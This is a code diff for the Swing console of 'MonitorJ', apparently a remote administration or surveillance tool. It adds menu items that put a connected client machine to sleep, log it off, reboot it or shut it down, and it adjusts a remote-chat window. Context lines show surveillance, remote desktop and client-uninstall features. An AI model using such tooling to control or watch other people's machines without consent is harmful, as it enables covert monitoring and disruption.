@@ -52,11 +52,6 @@ public class UserInterface extends javax.swing.JFrame {
         addSocketButton = new javax.swing.JButton();
         removeSocketButton = new javax.swing.JButton();
 
-        JMenuItem addSocket = new JMenuItem("Add Socket");
-        socketOptionMenu.add(addSocket);
-        JMenuItem removeSocket = new JMenuItem("Remove Socket");
-        socketOptionMenu.add(removeSocket);
-
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
         setTitle("MonitorJ v0.1");
 
@@ -313,16 +308,47 @@ public class UserInterface extends javax.swing.JFrame {
         JMenu systemSubMenu = new JMenu("System");
         systemSubMenu.setIcon(ResourceLoader.CLIENT_SYSTEM_MENU);
 
-        JMenuItem restartClientSystem = new JMenuItem("Restart", ResourceLoader.CLIENT_CONNECTION_UNINSTALL);
-        restartClientSystem.addActionListener(evt -> {
+        //TODO: Make the following work
+        JMenuItem sleepClientSystem = new JMenuItem("Sleep", ResourceLoader.CLIENT_SYSTEM_SLEEP);
+        sleepClientSystem.addActionListener(evt -> {
             BaseServerClient selectedClient = ServerManager.instance.getClientBySelectedRow();
-            ((DefaultTableModel) MonitorJ.getInstance().getUi().clientListTable.getModel()).removeRow(ServerManager.instance.getRowByClient(selectedClient));
             try {
-                selectedClient.getDataOutputStream().writeByte(Packets.UNINSTALL_CLIENT_APPLICATION.getPacketID());
+                selectedClient.getDataOutputStream().writeByte(Packets.SLEEP_CLIENT_SYSTEM.getPacketID());
             } catch (IOException e) {
                 e.printStackTrace();
             }
         });
+        JMenuItem logoffClientSystem = new JMenuItem("Log Off", ResourceLoader.CLIENT_SYSTEM_LOGOFF);
+        logoffClientSystem.addActionListener(evt -> {
+            BaseServerClient selectedClient = ServerManager.instance.getClientBySelectedRow();
+            ((DefaultTableModel) MonitorJ.getInstance().getUi().clientListTable.getModel()).removeRow(ServerManager.instance.getRowByClient(selectedClient));
+            try {
+                selectedClient.getDataOutputStream().writeByte(Packets.LOGOFF_CLIENT_SYSTEM.getPacketID());
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        });
+        JMenuItem restartClientSystem = new JMenuItem("Reboot", ResourceLoader.CLIENT_SYSTEM_RESTART);
+        restartClientSystem.addActionListener(evt -> {
+            BaseServerClient selectedClient = ServerManager.instance.getClientBySelectedRow();
+            ((DefaultTableModel) MonitorJ.getInstance().getUi().clientListTable.getModel()).removeRow(ServerManager.instance.getRowByClient(selectedClient));
+            try {
+                selectedClient.getDataOutputStream().writeByte(Packets.RESTART_CLIENT_SYSTEM.getPacketID());
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        });
+        JMenuItem shutdownClientSystem = new JMenuItem("Shutdown", ResourceLoader.CLIENT_SYSTEM_SHUTDOWN);
+        shutdownClientSystem.addActionListener(evt -> {
+            BaseServerClient selectedClient = ServerManager.instance.getClientBySelectedRow();
+            ((DefaultTableModel) MonitorJ.getInstance().getUi().clientListTable.getModel()).removeRow(ServerManager.instance.getRowByClient(selectedClient));
+            try {
+                selectedClient.getDataOutputStream().writeByte(Packets.SHUTDOWN_CLIENT_SYSTEM.getPacketID());
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        });
+        //
 
 
         JMenu surveillanceSubMenu = new JMenu("Surveillance");
@@ -341,12 +367,12 @@ public class UserInterface extends javax.swing.JFrame {
         JMenuItem remoteChat = new JMenuItem("Remote Chat", ResourceLoader.CLIENT_TOOLS_REMOTE_CHAT);
         remoteChat.addActionListener(evt -> {
             BaseServerClient selectedClient = ServerManager.instance.getClientBySelectedRow();
+            selectedClient.getRemoteDesktopFrame().setTitle("Remote Chat with " + selectedClient.CLIENT_PC_NAME + ":" + selectedClient.CLIENT_USER_NAME);
             try {
                 selectedClient.getDataOutputStream().writeByte(Packets.REMOTE_CHAT_START.getPacketID());
             } catch (IOException e) {
                 e.printStackTrace();
             }
-            selectedClient.getRemoteDesktopFrame().setTitle("Remote Chat with " + selectedClient.CLIENT_PC_NAME + ":" + selectedClient.CLIENT_USER_NAME);
             selectedClient.getRemoteChatFrame().setVisible(true);
         });
 
@@ -356,7 +382,10 @@ public class UserInterface extends javax.swing.JFrame {
         connectionSubMenu.add(uninstallClientApp);
         clientOptionMenu.add(connectionSubMenu);
 
-
+        systemSubMenu.add(sleepClientSystem);
+        systemSubMenu.add(logoffClientSystem);
+        systemSubMenu.add(restartClientSystem);
+        systemSubMenu.add(shutdownClientSystem);
         clientOptionMenu.add(systemSubMenu);
 
         surveillanceSubMenu.add(remoteDesktop);
